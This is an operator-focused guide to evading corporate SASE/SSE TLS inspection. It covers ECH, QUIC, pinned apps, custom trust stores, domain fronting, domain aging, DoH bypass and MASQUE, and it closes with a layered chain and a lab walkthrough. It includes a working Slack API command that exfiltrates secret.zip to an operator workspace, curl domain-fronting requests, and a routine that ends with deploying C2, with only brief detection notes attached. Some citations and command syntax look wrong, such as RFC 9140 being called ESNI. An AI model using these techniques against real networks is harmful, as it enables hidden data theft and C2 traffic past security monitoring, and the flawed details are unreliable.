# SASE / SSE TLS Inspection Evasion Guide

## Introduction

SASE/SSE vendors enforce HTTPS policy by intercepting TLS connections with their own root CA installed on endpoints. This is called TLS inspection, SSL interception, or SSL MITM. The inspection breaks the end-to-end TLS trust model; in exchange, the SSE can see the plaintext content.

TLS inspection evasion defeats this interception, allowing the operator to send content that the SSE cannot see. The techniques covered here target the inspection pipeline itself, not the policy logic.

This guide covers eight evasion techniques, with practical examples for each. For vendor-specific application of these techniques, see `quick-reference-card.md` §1.

## Objectives

By the end of this guide the operator should be able to:

- Understand the SSE TLS inspection pipeline and its weak points.
- Apply Encrypted ClientHello (ECH) to hide the inner SNI.
- Use HTTP/3 (QUIC) to evade SWGs that do not terminate UDP/443.
- Exploit certificate pinning in endpoint apps.
- Combine techniques for layered evasion.

## TLS Inspection Pipeline

The typical SSE inspection pipeline:

```
Endpoint → Captive Portal / Forwarder PAC → TLS MITM → Policy Engine → Destination
              │                                      │
              ▼                                      ▼
          Root CA                              Plaintext
        installed on                            for inspection
           endpoint
```

Weak points:

1. **SNI matching**: Most SSEs use the SNI server_name extension to make policy decisions before decryption.
2. **ECH support**: ECH encrypts the inner SNI; the outer SNI may not match policy.
3. **QUIC termination**: Many SSEs do not terminate QUIC, leaving UDP/443 uninspected.
4. **Pinned apps**: Apps with cert pinning refuse MITM; the SSE may pass through without inspection.
5. **Custom CA trust**: Apps that do not trust the SSE's root CA cannot be MITM'd silently.

## Evasion 1: Encrypted ClientHello (ECH)

ECH (formerly ESNI) encrypts the inner SNI using the HPKE public key advertised in the destination's DNS HTTPS record. The SSE sees only the outer SNI (typically a benign fronting domain).

### 1.1 Server-side prerequisite

The destination must support ECH. Major ECH-enabled properties:

- `cloudflare.com` and Cloudflare-hosted properties
- `mozilla.org`, `firefox.com`
- `www.google.com` (rolling out 2025-2026)
- `facebook.com`, `instagram.com` (Meta's CDN)
- Operator's own domain behind Cloudflare (free to enable)

### 1.2 Client-side enable

```bash
# Firefox (manual)
# Settings → Privacy & Security → DNS over HTTPS → Max Protection → Cloudflare
# about:config → network.dns.echconfig.enabled → true
# about:config → network.dns.use_https_rr_as_altsvc → true

# curl with ECH (curl 8.8+)
curl --ech "outer=cloudflare-ech.com,inner=operator.example.com" \
     https://operator.example.com/

# The SSE sees outer SNI = cloudflare-ech.com (categorized benign)
# Backend serves operator.example.com content
```

### 1.3 Detection

SSEs that do not terminate ECH see only the encrypted ClientHello. Detection options:

- Block ECH-enabled domains entirely (whitelist approach)
- Use JA4 fingerprint to identify ECH-aware clients
- Block outbound DoH (ECH requires HTTPS records fetched via DoH)

## Evasion 2: HTTP/3 (QUIC)

QUIC runs over UDP/443. Many legacy SWGs (Forcepoint < 8.5, older Bluecoat) terminate only TCP/443.

### 2.1 QUIC-capable server

```bash
# nginx with HTTP/3 (1.25.0+)
# /etc/nginx/nginx.conf
server {
    listen 443 quic reuseport;
    listen 443 ssl;
    http2 on;
    http3 on;
    ssl_certificate     /etc/letsencrypt/live/op.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/op.example.com/privkey.pem;
    
    add_header Alt-Svc 'h3=":443"; ma=86400';
    
    location / {
        proxy_pass http://127.0.0.1:8080;
    }
}
```

### 2.2 Client-side request

```bash
# curl with HTTP/3
curl --http3 https://op.example.com/

# The SSE sees UDP/443 traffic. If it does not terminate QUIC, it passes through.
```

### 2.3 Detection

SSEs that support QUIC termination (Zscaler ZIA, Netskope, Forcepoint 8.5+) intercept QUIC. Detection options:

- Block outbound UDP/443 entirely
- Allowlist QUIC-capable destinations

## Evasion 3: Certificate Pinning Abuse

Mobile apps and Electron apps often pin server certificates. If the SSE MITMs a pinned connection, the app refuses. Some SSEs are configured to pass-through pinned connections (do not inspect), creating a bypass.

### 3.1 Identify pinned apps

```bash
# iOS: use Objection or Frida to enumerate pins
objection -g 'com.example.app' explore
com-example-app> ios sslpinning list

# Android: log the SSLHandshake exceptions
adb logcat | grep -i "SSLHandshakeException\|certificate"

# macOS: search binary for pin constants
strings -a /Applications/Slack.app/Contents/MacOS/Slack | grep -i "pin\|sha256/"
```

### 3.2 Use pinned app as exfil channel

If Slack pins its certs and the SSE passes Slack through uninspected:

```bash
# Operator creates a Slack workspace (free)
# Slack API: https://slack.com/api/files.upload

# Upload file via Slack (passes through SSE uninspected)
TOKEN=xoxb-operator-bot-token
curl -F "file=@secret.zip" \
     -F "channels=C12345678" \
     -H "Authorization: Bearer $TOKEN" \
     https://slack.com/api/files.upload
```

The SSE sees only TLS to `slack.com`; the file content is invisible.

### 3.3 Detection

Pinned apps are difficult to detect because the SSE is designed to pass them through. Options:

- Block specific pinned apps entirely (e.g., personal Slack)
- Detect volume anomalies (1 GB to Slack in 1 hour is unusual)

## Evasion 4: Custom CA Trust Refusal

The SSE installs its root CA on managed endpoints. Apps that do not use the OS trust store (Java apps with custom keystores, Go binaries with bundled CAs) refuse the MITM.

### 4.1 Java with custom truststore

```java
// Java app loading a custom truststore, not the OS one
System.setProperty("javax.net.ssl.trustStore", "/app/cacerts");
System.setProperty("javax.net.ssl.trustStorePassword", "changeit");

// The MITM cert from SSE is not in /app/cacerts
// Java app refuses to connect → SSE must pass through or fail
```

### 4.2 Go binary with embedded cert pool

```go
import "crypto/x509"

pool := x509.NewCertPool()
pool.AppendCertsFromPEM(embeddedCAs)  // only bundled CAs

tlsConfig := &tls.Config{RootCAs: pool}
// Will reject SSE MITM cert
```

## Evasion 5: Domain Fronting

Domain fronting uses a CDN's routing to disguise the destination. The SSE sees SNI of a benign CDN; the actual content is served from the operator's backend on the same CDN.

### 5.1 Cloudflare fronting

```bash
# Operator hosts payload on Cloudflare Workers
# Worker route: operator-worker.workers.dev

# Request to benign Cloudflare domain
curl --resolve cdn.cloudflare.net:443:1.2.3.4 \
     -H "Host: operator-worker.workers.dev" \
     https://cdn.cloudflare.net/
```

Cloudflare has restricted domain fronting since 2019, but the technique still works for same-CDN fronting (both ends on Cloudflare).

### 5.2 AWS CloudFront fronting

```bash
# Both endpoints on CloudFront
# Target SNI: d111111abcdef8.cloudfront.net (benign-looking)
# Host header: d222222abcdef8.cloudfront.net (operator's distribution)

curl --resolve d111111abcdef8.cloudfront.net:443:13.224.0.0 \
     -H "Host: d222222abcdef8.cloudfront.net" \
     https://d111111abcdef8.cloudfront.net/
```

### 5.3 Detection

CloudFront and Cloudflare now log the Host header in their access logs, allowing SSE operators to correlate. Detection options:

- Compare SNI to Host header; mismatch = domain fronting
- Block CloudFront/Cloudflare IPs not on a known-good allowlist

## Evasion 6: Domain Aging

New domains have no reputation. Most reputation-based SSEs categorize them as "new-domain" or pass them through.

### 6.1 Operational discipline

```bash
# Register domain 7+ days before engagement
whois operator-controlled.com

# Park on a benign landing page during aging
echo "<html><body>Coming soon</body></html>" > /var/www/index.html

# Day 8: deploy C2
# Categorized as "newly-registered" (low-risk in most SSEs)
```

### 6.2 Detection

Volume-based reputation is brittle. Detection options:

- Block newly-registered domains (7-30 days) entirely
- Treat any traffic to a newly-registered domain as suspicious

## Evasion 7: Custom DoH (DNS-over-HTTPS) Endpoint

SSEs that enforce DNS-layer policy can be bypassed by sending DNS queries over HTTPS to a non-SSE resolver.

```bash
# Install dnscrypt-proxy on endpoint
brew install dnscrypt-proxy

# Configure to use Cloudflare DoH exclusively
# /opt/homebrew/etc/dnscrypt-proxy.toml
server_names = ['cloudflare']
listen_addresses = ['127.0.0.1:53']

# Start
brew services start dnscrypt-proxy

# All DNS now goes to https://cloudflare-dns.com/dns-query
# SSE sees only HTTPS to cloudflare-dns.com
```

### 7.1 Detection

- Block known DoH endpoints (whack-a-mole)
- JA3 fingerprint dnscrypt-proxy and block
- Block outbound TCP/443 to non-corporate DNS resolvers

## Evasion 8: MASQUE / HTTP/2 CONNECT-UDP

MASQUE is a newer IETF standard for tunneling UDP through HTTP/2. Some SSEs do not yet inspect MASQUE tunnels.

```bash
# Apple iOS supports MASQUE for iCloud Private Relay
# Operators can run their own MASQUE server

# Reference implementation: github.com/coredhcp/masq
# Run server
./masque-server -listen :443 -cert cert.pem -key key.pem

# Client (Go): github.com/marten-seemann/masque-go
```

## Layered Evasion

The strongest evasion combines multiple techniques:

```
Endpoint
  ↓ dnscrypt-proxy (DoH to Cloudflare)         [Evasion 7]
  ↓ curl with ECH                                [Evasion 1]
  ↓ Fronted via Cloudflare                       [Evasion 5]
  ↓ Backend on operator's 8-day-old domain       [Evasion 6]
Destination
```

Each layer must be defeated independently. The SSE must:
1. Inspect DoH (requires cert pinning bypass).
2. Decrypt ECH (ECH support required).
3. Block Cloudflare fronting (correlation required).
4. Flag aged domain (reputation lag).

## Practice / Lab Walkthrough

Authorized-lab exercise:

1. Configure Zscaler ZIA lab tenant with category-based policy.
2. Test Evasion 1 (ECH): Use `curl --ech` against Cloudflare-backed domain. Verify Zscaler sees only outer SNI.
3. Test Evasion 3 (Pinning): Upload via Slack API. Verify Zscaler passes through uninspected.
4. Test Evasion 5 (Fronting): Use Cloudflare Workers fronting. Verify Zscaler sees CDN SNI.
5. Test layered: Combine DoH + ECH + Fronting. Verify Zscaler sees nothing actionable.

## References & Resources

- IETF RFC 9460 — SVCB and HTTPS RR (for ECH publish)
- IETF RFC 9140 — Encrypted Server Name Indication (ESNI, predecessor to ECH)
- IETF RFC 9114 — HTTP/3
- IETF draft-ietf-masque-protocol — MASQUE
- Cloudflare blog — *Encrypted ClientHello* (2020-2024 series)
- Black Hat USA 2023 — *Disarming the Endpoint Agent*

---

*End of guide. For the operational cheat sheet see `quick-reference-card.md`.*
